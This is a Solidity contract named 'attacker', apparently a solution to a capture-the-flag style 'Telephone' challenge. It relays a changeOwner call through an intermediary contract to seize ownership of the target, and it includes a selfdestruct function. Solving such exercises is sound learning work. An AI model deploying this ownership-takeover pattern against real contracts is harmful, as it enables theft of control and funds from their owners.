// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

import './Telephone.sol';

contract attacker {

    Telephone telContract;

    constructor(address _addr){
        telContract = Telephone(_addr);
    }

    function makeAttempt(address _myaddr) external {
        telContract.changeOwner(_myaddr);
    }

    function kill() external {
        selfdestruct(payable(msg.sender));
    }
}
